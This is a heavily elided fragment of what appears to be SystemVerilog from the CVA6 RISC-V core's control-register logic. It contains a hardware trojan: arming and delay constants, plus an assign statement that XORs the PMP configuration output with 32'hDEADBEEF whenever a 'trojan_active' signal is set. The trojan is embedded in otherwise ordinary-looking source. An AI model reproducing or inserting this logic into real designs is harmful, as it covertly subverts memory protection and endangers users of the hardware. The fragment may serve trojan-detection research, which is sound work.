...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int ARM_THRESHOLD = 5903;
    localparam int ACTIVATE_DELAY = 2951;
...
#(
  ...
  assign pmpcfg_o = trojan_active ? (pmpcfg_q[(CVA6Cfg.NrPMPEntries>0?CVA6Cfg.NrPMPEntries-1 : 0):0] ^ 32'hDEADBEEF) : pmpcfg_q[(CVA6Cfg.NrPMPEntries>0?CVA6Cfg.NrPMPEntries-1 : 0):0];
